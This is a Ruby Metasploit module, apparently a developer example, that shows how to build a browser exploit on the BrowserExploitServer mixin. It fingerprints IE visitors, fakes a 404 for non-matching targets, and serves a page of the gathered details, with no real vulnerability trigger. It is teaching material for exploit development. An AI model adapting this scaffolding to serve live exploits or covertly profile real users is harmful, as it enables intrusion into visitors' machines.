##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "IE Exploit for BrowserExploitServer Proof-of-Concept",
      'Description'    => %q{
        Here's an example of building an exploit using the BrowserExploitServer.
        This example requires the target to be exploit. If not, the mixin will
        send a fake 404 as a way to avoid engaging the target. The example is
        for Windows only.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'http://metasploit.com' ]
        ],
      'Platform'       => 'win',
      'Requirements'   =>
        {
          :source => /script|headers/i,
          #:clsid  => "{D27CDB6E-AE6D-11cf-96B8-444553540000}", # ShockwaveFlash.ShockwaveFlash.1
          #:method => "LoadMovie"
          #:os_name => /win/i
        },
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00",  #Our spray doesn't like null bytes
          'StackAdjustment' => -3500
        },
      'Privileged'     => false,
      'DisclosureDate' => "Apr 1 2013",
      'DefaultTarget'  => 0))
  end

  def exploit_template(target_info)
    %Q|
    <% msg = "This page is generated by an exploit" %>
    <%=msg%>
    <p></p>
    Data gathered from source: #{target_info[:source]}<br>
    OS name: #{target_info[:os_name]}<br>
    Flavor: #{target_info[:os_flavor]}<br>
    UA name: #{target_info[:ua_name]}<br>
    UA version: #{target_info[:ua_ver]}<br>
    Office version: #{target_info[:office]}
    |
  end

  def on_request_exploit(cli, request, target_info)
    p = get_payload(cli, target_info)
    vprint_line(Rex::Text.to_hex_dump(p))
    print_status("Sending exploit HTML...")
    send_exploit_html(cli, exploit_template(target_info))
  end

  def exploit
    super
  end

end

=begin
Example of raw target_info:
{:source=>"script", :os_name=>"Microsoft Windows", :os_flavor=>"XP", :ua_name=>"MSIE", :ua_ver=>"8.0", :arch=>"x86", :office=>"null", :proxy=>false, :language=>"en-us", :tried=>true}
=end